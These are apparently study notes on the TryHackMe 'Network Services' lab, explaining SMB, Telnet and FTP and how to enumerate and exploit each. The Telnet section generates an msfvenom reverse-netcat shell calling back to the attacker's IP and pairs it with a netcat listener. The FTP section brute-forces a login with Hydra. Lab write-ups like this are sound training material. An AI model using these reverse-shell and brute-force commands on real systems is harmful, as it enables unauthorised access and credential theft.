# TryHackMe – Network Services 1

## Table of Contents
- Understanding SMB  
- Enumerating SMB  
- Exploiting SMB  
- Understanding Telnet  
- Enumerating Telnet  
- Exploiting Telnet  
- Understanding FTP  
- Enumerating FTP  
- Exploiting FTP  

---

## Understanding SMB

**SMB (Server Message Block)** is a protocol used to share access to files, printers, serial ports, and other resources over a network.

- SMB uses a **request–response** communication model.
- SMB ports:
  - **139**
  - **445**

---

## Enumerating SMB

**Tool used:**

### Enum4Linux
Enum4Linux is used to enumerate SMB shares on both Windows and Linux systems.

**Syntax:**
```bash
enum4linux [options] <ip>
```

**Common options:**
- `-U` : List users  
- `-M` : List machines  
- `-N` : List names  
- `-S` : List shares  
- `-P` : Password policy  
- `-G` : Groups and members  
- `-a` : Full enumeration  

**Example command:**
```bash
enum4linux -a 10.10.144.145
```

---

## Exploiting SMB

**Tool used:**

### smbclient
`smbclient` is similar to an FTP client and allows access to SMB resources.

**Command to connect:**
```bash
smbclient //10.10.10.2/secret -U suit -p 445
```

---

## Understanding Telnet

**Telnet** is a protocol used for text-based communication between two machines.

- Default Telnet port: **23**
- Major issue: **Telnet does not encrypt data**. All information is transmitted in clear text.

**Command to connect to a Telnet server:**
```bash
telnet <ip> <port>
```

---

## Enumerating Telnet

**Nmap scan for Telnet:**
```bash
nmap <target_ip> -p <port>
```

**Example note:**
- Non-standard ports can be checked by specifying ports instead of using `-p-`.

---

## Exploiting Telnet

### Reverse Shell via Telnet

**Generate a reverse shell using msfvenom:**
```bash
msfvenom -p cmd/unix/reverse_netcat lhost=<your_tun0_ip> lport=4444 R
```

**Start a Netcat listener:**
```bash
nc -lvp 4444
```

**Payload example (starts with):**
```bash
mkfifo
```

**Execution:**
- Copy and execute the payload inside the Telnet session.

---

## Understanding FTP

**FTP (File Transfer Protocol)** is used to transfer files between a client and a server.

- Default FTP port: **21**

---

## Enumerating FTP

**Nmap scan for FTP:**
```bash
nmap <target_ip> -p 21
```

**Anonymous login:**
```bash
ftp <ip>
```

**Credentials:**
- Username: `anonymous`
- Password: *(empty)*

**File found in anonymous directory:**
```
PUBLIC_NOTICE.txt
```

---

## Exploiting FTP

### Brute Force with Hydra

**Hydra command:**
```bash
hydra -t 4 -l mike -P <wordlist> -vv 10.10.129.96 ftp
```

**Options explained:**
- `-t 4` : 4 parallel tasks  
- `-l mike` : Username  
- `-P <wordlist>` : Password list  
- `-vv` : Verbose mode  
- `ftp` : Target service  

**FTP login as user `mike`:**
```bash
ftp <ip>
```
